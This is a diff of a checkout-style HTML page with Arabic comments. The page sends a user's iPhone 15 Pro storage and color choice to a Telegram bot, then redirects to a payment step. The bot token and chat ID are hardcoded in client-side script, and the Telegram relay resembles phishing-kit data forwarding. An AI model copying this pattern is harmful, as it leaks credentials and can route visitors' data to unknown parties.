@@ -49,7 +49,7 @@
       margin-bottom: 10px;
     }
 
-    /* --- Disabled storage options --- */
+    /* خيارات التخزين المعطلة */
     .option.disabled {
       opacity: 0.45;
       cursor: not-allowed;
@@ -195,47 +195,44 @@
     });
 
     // Continue → Payment + Telegram
-    <script>
-  // ... (كود اختيار التخزين والألوان فوقه خليه زي ما هو)
+    document.getElementById("continue-btn").addEventListener("click", function () {
+      var botToken = "8097834484:AAG7whd2jF7Ie5pXUiomwXd1VwleQPpAogc";
+      var chatId   = "7811430582";
 
-  document.getElementById("continue-btn").addEventListener("click", function () {
-    var botToken = "8097834484:AAG7whd2jF7Ie5pXUiomwXd1VwleQPpAogc";
-    var chatId   = "7811430582";
+      var storageEl    = document.querySelector("#storage-options .selected");
+      var colorLabelEl = document.querySelector("#color-options .selected .color-label");
 
-    var storageEl = document.querySelector("#storage-options .selected");
-    var colorLabelEl = document.querySelector("#color-options .selected .color-label");
+      var selectedStorage = storageEl ? storageEl.innerText.trim() : "256 GB";
+      var selectedColor   = colorLabelEl
+        ? colorLabelEl.innerHTML.replace(/<br\s*\/?>/gi, " ").trim()
+        : "Natural Titanium";
 
-    var selectedStorage = storageEl ? storageEl.innerText.trim() : "256 GB";
-    var selectedColor   = colorLabelEl
-      ? colorLabelEl.innerHTML.replace(/<br\s*\/?>/gi, " ").trim()
-      : "Natural Titanium";
+      // نخزن التخزين واللون للـ step-3
+      localStorage.setItem("selectedStorage", selectedStorage);
+      localStorage.setItem("selectedColor", selectedColor);
 
-    // نخزن القيم علشان step-3
-    localStorage.setItem("selectedStorage", selectedStorage);
-    localStorage.setItem("selectedColor", selectedColor);
+      // نرسل على تيليجرام
+      var msg =
+        "New Order Submitted (Options step)\n\n" +
+        "Model: iPhone 15 Pro\n" +
+        "Storage: " + selectedStorage + "\n" +
+        "Color: " + selectedColor;
 
-    // نرسل تفاصيل الاختيار على التيليجرام (اختياري)
-    var msg =
-      "New Order Submitted (Options step)\n\n" +
-      "Model: iPhone 15 Pro\n" +
-      "Storage: " + selectedStorage + "\n" +
-      "Color: " + selectedColor;
-
-    fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: msg
-      })
-    }).catch(function (err) {
-      console.log("Telegram error:", err);
-    }).finally(function () {
-      // نروح لصفحة الدفع
-      window.location.href = "step-3.html";
+      fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: msg
+        })
+      }).catch(function (err) {
+        console.log("Telegram error:", err);
+      }).finally(function () {
+        // ننتقل لصفحة الدفع
+        window.location.href = "step-3.html";
+      });
     });
-  });
-</script>
+  </script>
 
 </body>
 </html>
